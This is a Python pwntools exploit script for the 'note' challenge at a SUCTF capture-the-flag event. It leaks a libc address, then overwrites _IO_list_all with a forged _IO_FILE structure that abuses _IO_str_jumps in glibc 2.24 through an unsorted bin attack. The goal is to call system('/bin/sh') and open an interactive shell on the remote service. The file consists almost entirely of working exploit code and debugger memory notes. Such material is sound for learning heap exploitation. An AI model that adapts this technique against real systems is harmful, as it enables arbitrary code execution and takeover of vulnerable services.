# coding:utf-8
#!/usr/bin/env python2
import copy
from ctypes import *
from pwn import *
elf = ELF('./note')
LOCAL = 0
if LOCAL:
	libc = ELF("./libc-2.24.so")
	p = process('./note',env={"LD_PRELOAD":"./libc-2.24.so"})
	context.log_level = 'debug'
else:
	libc = ELF('./libc6_2.24-12ubuntu1_amd64.so')
	p = remote('pwn.suctf.asuri.org',20003)#47.104.16.75 8997
#    context.log_level = 'debug'

def z(a=''):
	gdb.attach(p,a)
	if a == '':
		raw_input()

def menu(index):
	p.recvuntil('Choice>>')
	p.sendline(str(index))

def Add(size,Content):
	menu(1)
	p.recvuntil('Size:')
	p.sendline(str(size))
	p.recvuntil('Content:')
	p.sendline(Content)

def Show(index):
	menu(2)
	p.recvuntil('Index:')
	p.sendline(str(index))

def Pandora():
	menu(3)
	p.recvuntil('This is a Pandora box,are you sure to open it?(yes:1)')
	p.sendline(str(1))

Add(0x88,'aaaaaaaa')
Pandora()
Show(0)
p.recvuntil('Content:')
data = u64(p.recv(6).ljust(8,'\x00'))
print 'data:' + hex(data)
off = 0x7f0373c4eb78 - 0x7f0373c4eb10
libc_base = data - off - libc.symbols['__malloc_hook']
print 'libc_base:' + hex(libc_base)

system = libc_base + libc.symbols['system']
#binsh = libc_base + next(libc.search('/bin/sh'))
binsh = libc_base + libc.search('/bin/sh\x00').next()
print 'off:' + hex(libc.symbols['_IO_file_jumps'] + (0x7f3219d1d4c0 -  0x7f3219d1d400))

# 0x7f3219d1d400 <_IO_file_jumps>
# _IO_str_jumps:0x7f3219d1d4c0


_IO_str_jumps = libc.symbols['_IO_file_jumps'] + (0x7f3219d1d4c0 -  0x7f3219d1d400) + libc_base
_IO_list_all = libc_base + libc.symbols['_IO_list_all']
print 'system:' + hex(system)
print 'binsh:' + hex(binsh)
print '_IO_str_jumps:' + hex(_IO_str_jumps)
print '_IO_list_all:' + hex(_IO_list_all)


from FILE import *
context.arch = 'amd64'
# unsorted bin attack
# payload = 'a'*0x80
# fake_file = IO_FILE_plus_struct()
# fake_file._flags = 0
# fake_file._IO_read_ptr = 0x61
# fake_file._IO_read_base =_IO_list_all - 0x10
# fake_file._IO_buf_base = binsh
# fake_file._mode = 0
# fake_file._IO_write_base = 0
# fake_file._IO_write_ptr = 1
# fake_file.vtable = _IO_str_jumps - 8
# payload+=str(fake_file).ljust(0xe8,'\x00') + p64(system)


payload = 'a'*0x80
fake_file = IO_FILE_plus_struct()
fake_file._flags = 0
fake_file._IO_read_ptr = 0x61
fake_file._IO_read_base =_IO_list_all - 0x10
fake_file._IO_write_base = 0
fake_file._IO_write_ptr = 0x7fffffffffffffff
fake_file._IO_buf_base = 0
fake_file._IO_buf_end = (binsh-100)/2
fake_file._mode = 0
fake_file.vtable =_IO_str_jumps
payload += str(fake_file).ljust(0xe0,'\x00')+p64(system)


Add(0x80, payload)  # size 0x2A1



p.interactive()
#z()


	
# 0x7f0373c4eb10 <__malloc_hook>:

# 0x7f0373c4eb78 <main_arena+88>:	0x559484db61b0

# 0x7faa0c7294c0:	0x0	0x0
# 0x7faa0c7294d0:	0x7faa0c3ea650	0x7faa0c3ea2b0 <_IO_str_overflow>
# 0x7faa0c7294e0:	0x7faa0c3ea250 <_IO_str_underflow>	0x7faa0c3e88a0 <_IO_default_uflow>
# 0x7faa0c7294f0:	0x7faa0c3ea630 <_IO_str_pbackfail>	0x7faa0c3e8900 <_IO_default_xsputn>
# 0x7faa0c729500:	0x7faa0c3e8a90 <_IO_default_xsgetn>	0x7faa0c3ea780 <_IO_str_seekoff>
